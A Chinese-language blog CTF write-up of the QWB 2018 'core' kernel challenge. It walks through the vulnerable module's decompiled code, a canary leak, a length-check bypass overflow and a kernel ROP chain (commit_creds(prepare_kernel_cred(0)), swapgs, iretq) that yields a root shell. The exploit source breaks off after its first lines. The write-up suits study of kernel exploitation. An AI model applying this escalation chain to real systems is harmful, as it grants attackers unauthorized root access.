<!doctype html>
<html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>kernel_pwn ROP - An9Ela</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="An9Ela"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="An9Ela"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="kernel 通常一个内核由负责响应中断的中断服务程序，负责管理多个进程从而分享处理器时间的调度程序，负责管理进程地址空间的内存管理程序，进程间通讯等系统服务程序共同组成。  –linux内核设计与实现  一直想学kernel pwn，但迟迟没有开始（懒🤦）。最近又心血来潮，翻开了linux内核设计与实现这本书，准备看这本来入门kernel。这将会是一个系列，记录下自己的学习过程（读书笔记+ke"><meta property="og:type" content="article"><meta property="og:title" content="kernel_pwn ROP"><meta property="og:url" content="https://github.com/CodingAngela/CodingAngela.github.io.git/2020/11/07/kernel_pwn(1)/"><meta property="og:site_name" content="An9Ela"><meta property="og:description" content="kernel 通常一个内核由负责响应中断的中断服务程序，负责管理多个进程从而分享处理器时间的调度程序，负责管理进程地址空间的内存管理程序，进程间通讯等系统服务程序共同组成。  –linux内核设计与实现  一直想学kernel pwn，但迟迟没有开始（懒🤦）。最近又心血来潮，翻开了linux内核设计与实现这本书，准备看这本来入门kernel。这将会是一个系列，记录下自己的学习过程（读书笔记+ke"><meta property="og:image" content="https://github.com/img/og_image.png"><meta property="article:published_time" content="2020-11-07T14:00:20.000Z"><meta property="article:modified_time" content="2020-11-07T14:18:08.205Z"><meta property="article:author" content="An9Ela"><meta property="article:tag" content="CTF"><meta property="article:tag" content="KERNEL"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://github.com/CodingAngela/CodingAngela.github.io.git/2020/11/07/kernel_pwn(1)/"},"headline":"kernel_pwn ROP","image":["https://github.com/img/og_image.png"],"datePublished":"2020-11-07T14:00:20.000Z","dateModified":"2020-11-07T14:18:08.205Z","author":{"@type":"Person","name":"An9Ela"},"publisher":{"@type":"Organization","name":"An9Ela","logo":{"@type":"ImageObject"}},"description":"kernel 通常一个内核由负责响应中断的中断服务程序，负责管理多个进程从而分享处理器时间的调度程序，负责管理进程地址空间的内存管理程序，进程间通讯等系统服务程序共同组成。  –linux内核设计与实现  一直想学kernel pwn，但迟迟没有开始（懒🤦）。最近又心血来潮，翻开了linux内核设计与实现这本书，准备看这本来入门kernel。这将会是一个系列，记录下自己的学习过程（读书笔记+ke"}</script><link rel="canonical" href="https://github.com/CodingAngela/CodingAngela.github.io.git/2020/11/07/kernel_pwn(1)/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">An9Ela</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Gepostet vor&nbsp;<time dateTime="2020-11-07T14:00:20.000Z" title="2020-11-7 10:00:20 ├F10: PM┤">2020-11-07</time></span><span class="level-item">Aktualisiert vor&nbsp;<time dateTime="2020-11-07T14:18:08.205Z" title="2020-11-7 10:18:08 ├F10: PM┤">2020-11-07</time></span></div></div><h1 class="title is-3 is-size-4-mobile">kernel_pwn ROP</h1><div class="content"><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><blockquote>
<p>通常一个内核由负责响应中断的中断服务程序，负责管理多个进程从而分享处理器时间的调度程序，负责管理进程地址空间的内存管理程序，进程间通讯等系统服务程序共同组成。  –linux内核设计与实现</p>
</blockquote>
<p>一直想学kernel pwn，但迟迟没有开始（懒🤦）。最近又心血来潮，翻开了<code>linux内核设计与实现</code>这本书，准备看这本来入门kernel。这将会是一个系列，记录下自己的学习过程（读书笔记+kernel_pwn题目复现），希望自己可以坚持下去🎃。</p>
<span id="more"></span>
<p>kernel顾名思义是操作的核心，它其实起到了一个承上（用户空间）启下（硬件设备）的作用。应用程序通过系统调用来与内核通信，内核通过处理中断（通过中断号找中断服务程序）来管理系统的硬件设备。<br>注意：很多操作系统的中断服务程序，包括linux，都不在进程上下文中执行；而是在专门的中断上下文中运行，与所有进程都无关。</p>
<h4 id="kernel-pwn-ROP"><a href="#kernel-pwn-ROP" class="headerlink" title="kernel_pwn_ROP"></a>kernel_pwn_ROP</h4><blockquote>
<p>题目来自qwd2018_core。</p>
</blockquote>
<p>就ctf里kernel pwn而言我们所要做的就是提权（得到一个root权限的进程）。挖掘出存在于kernel模块里的漏洞并通过用户态的相应的系统调用进到内核态中去触发漏洞从而到达提权的目的。<br>直接撸题✔<br>解压之后可以看到这些文件：<br>bzImage：压缩后的内核镜像<br>vmlinux：编译出的原始内核文件，没有被压缩而且是静态连接的。<br>.sh：qemu的启动脚本<br>.cpio：打包后的文件系统</p>
<p>我们首先看下.sh文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>解释下参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-m 指定内存(RAM)大小</span><br><span class="line">-kernel 指定内核镜像</span><br><span class="line">-initrd 指定内核启动的文件系统</span><br><span class="line">-qppend 附加选项 指定no kaslr可以关闭地址随机化</span><br><span class="line">-s 相当于-gdb tcp::1234，可以用gdb ./vmlinux调试</span><br><span class="line">-smp 用于声明所有可能用到的cpus, i.e. sockets cores threads = maxcpus.</span><br><span class="line">-cpu 设置CPU的安全选项</span><br></pre></td></tr></table></figure>

<p>保护机制：<br>常见的有kaslr（地址随机化），smep(内核态不可执行用户态的代码)，smap(内核态不可访问用户态的数据)。</p>
<p>解题过程：<br>拿到这些文件后首先要做的就是解包.cpio文件，但不要在共享文件夹下进行此操作，会导致解包的软链接出错。我一般是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp give_to_player /home/an9ela/kernel</span><br><span class="line">cd /home/an9ela/kernel/give_to_player</span><br><span class="line">mkdir core</span><br><span class="line">mv core.cpio core.cpio.gz</span><br><span class="line">mv core.cpio.gz ./core</span><br><span class="line">cd core</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpiow  //解包操作</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; ../core.cpio //打包操作，这题给了gen_cpio.sh直接./gen_cpio core.cpio</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到文件系统之后首先要看的就是Init文件了，这个是初始化内核时所进行的操作“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms    //备份了kallsyms到tmp文件夹下</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict  //即我们不能通过/proc/kallsyms获得函数地址，但/tmp/kallsyms是不受影响的</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict //无法通过dmesg查看内核的输出</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko    //插入core.ko模块，该模块也即我们要重点分析的模块</span><br><span class="line">poweroff -d 120 -f &amp;  //这句设置了120s自动关机，为不影响调试可以删掉</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh   //我们的shell的uidgid为1000，root为0</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>接下来就要分析core.ko模块了，可以用ida打开。<br>首先查看init_module函数，该函数会在模块加载时执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数调用proc_create创建了名为core的虚拟文件，应用层通过读写改文件实现与内核的交互。<br>其中第三个参数file_operations存储了内核模块提供的对设备进行各种操作的函数指针，对于用户态而言也可以理解为我们可以通过core文件能进行那些操作。<br>点进去fop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000438                 dq offset core_write</span><br><span class="line">.data:0000000000000468                 dq offset core_ioctl</span><br><span class="line">.data:0000000000000498                 dq offset core_release</span><br></pre></td></tr></table></figure>
<p>可见能执行的操作为write,ioctl,release</p>
<p>接下来是core_ioctl函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line"></span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>int ioctl(int fd, ind cmd, …);是设备驱动程序中对设备的io通道进行管理的函数。其中fd是用户程序打开设备时使用open函数返回的文件标识符，cmd是用户程序对设备的控制命令。<br>ioctl是文件结构中的一个属性分量，如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数实现对设备io通道的控制。<br>意思就是如果lkm中提供了ioctl功能（比如上面的这个函数），并且实现了对应指令的操作，那么在用户态中，通过这个驱动程序，我们就可以调用ioctl函数来直接调用模块中的操作。</p>
<p>而这里就提供了ioctl功能，继续分析core_read()。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="type">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="type">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>  copy_to_user()函数中将v5+off中的0x40长度的数据拷贝到用户空间，其中off是bss上的全局变量。<br>  而case 0x6677889C就给了我们控制off的机会，因此我们利用通过控制off&#x3D;0x40来leak canary。</p>
<p>  core_copy_func函数：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  __int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(&amp;v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>首先对长度进行了检查，但注意数据类型，a1为int64，而在qmemcpy函数里类型了uint16，因此我们设计a1为0xffffffff00000000|(real_len)使int64为负数，从而绕过检查的同时造成溢出。</p>
<p>这样分析下来利用思路就很明确了：<br>先利用core_read()泄露canary，之后再利用core_cpoy_func在内核栈里构造rop，使其在内核态执行commit_creds(prepare_kernel_cred(0))使得进程的uidgid&#x3D;0，然后返回到用户态执行system(“&#x2F;bin&#x2F;sh)从而完成提权。</p>
<p>难点在于rop的构造。<br>对于执行commit_creds(prepare_kernel_cred(0))来说，传参和用户态的一致，但要注意commit_creds()的参数是prepare_kernel_cred(0)函数的返回值。<br>从内核态返回用户态时要用到条指令swapgs和iretq。在执行iretq之前，执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。</p>
<p>iret(特权返回)指令从内核空间返回到用户空间进程。但是iret(64位下为iretq)期望的特定的堆栈布局如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| iretq_ret            |</span><br><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure>
<p>新的用户空间指令指针(RIP)，用户空间堆栈指针(RSP)，代码和堆栈段选择器(CS和SS)以及具有各种状态信息的EFLAGS寄存器。<br>一般我们用以下的扩展内联汇编获得所需的寄存器的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)    <span class="comment">//output</span></span><br><span class="line">       :                                                        <span class="comment">//input</span></span><br><span class="line">       :<span class="string">&quot;memory&quot;</span>                                               <span class="comment">//list of clobbered registers即改变的内容</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>rop：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000│ rsp  0xffffa47a800e7e60 —▸ 0x7ffec40e5570 ◂— add    byte ptr [rcx - 0x70], dl /* 0x44777d3bde905100 */</span><br><span class="line">01:0008│      0xffffa47a800e7e68 —▸ 0xffffffffb2200b2f ◂— pop    rdi /* 0x722540358b4cc35f */</span><br><span class="line">02:0010│      0xffffa47a800e7e70 ◂— 0</span><br><span class="line">03:0018│      0xffffa47a800e7e78 —▸ 0xffffffffb229cce0 ◂— push   rbp /* 0x153d8b48fd894855 */</span><br><span class="line">04:0020│      0xffffa47a800e7e80 —▸ 0xffffffffb2221e53 ◂— pop    rcx /* 0xffdf89480127c359 */</span><br><span class="line">05:0028│      0xffffa47a800e7e88 —▸ 0xffffffffb229c8e0 ◂— push   r12 /* 0x4025248b4c655441 */</span><br><span class="line">06:0030│      0xffffa47a800e7e90 —▸ 0xffffffffb23ae978 ◂— mov    rdi, rax /* 0xc28ee9e1ffc78948 */</span><br><span class="line">07:0038│      0xffffa47a800e7e98 —▸ 0xffffffffb2c012da ◂— swapgs  /* 0x485590c39df8010f */</span><br><span class="line">08:0040│      0xffffa47a800e7ea0 ◂— 0</span><br><span class="line">09:0048│      0xffffa47a800e7ea8 —▸ 0xffffffffb2250ac2 ◂— iretq   /* 0x1f0f2e6690c3cf48 */</span><br><span class="line">0a:0050│      0xffffa47a800e7eb0 —▸ 0x400eac ◂— push   rbp</span><br><span class="line">0b:0058│      0xffffa47a800e7eb8 ◂— 0x33 /* &#x27;3&#x27; */</span><br><span class="line">0c:0060│      0xffffa47a800e7ec0 ◂— 0x282</span><br><span class="line">0d:0068│      0xffffa47a800e7ec8 —▸ 0x7ffec40e45c0 ◂— 0</span><br><span class="line">0e:0070│      0xffffa47a800e7ed0 ◂— 0x2b /* &#x27;+&#x27; */</span><br><span class="line">0f:0078│      0xffffa47a800e7ed8 ◂— 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*(ptr + i++) = canary;</span><br><span class="line">*(ptr + i++) = rbp;</span><br><span class="line">*(ptr + i++) = prdi_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">*(ptr + i++) = prcx_ret;</span><br><span class="line">*(ptr + i++) = commit_creds;</span><br><span class="line">*(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">*(ptr + i++) = swapgs_p_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = iretq_ret;</span><br><span class="line">*(ptr + i++) = (uint64_t) launch_shell;</span><br><span class="line">*(ptr + i++) = tf.cs;</span><br><span class="line">*(ptr + i++) = tf.rflags;</span><br><span class="line">*(ptr + i++) = tf.rsp;</span><br><span class="line">*(ptr + i++) = tf.ss;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span 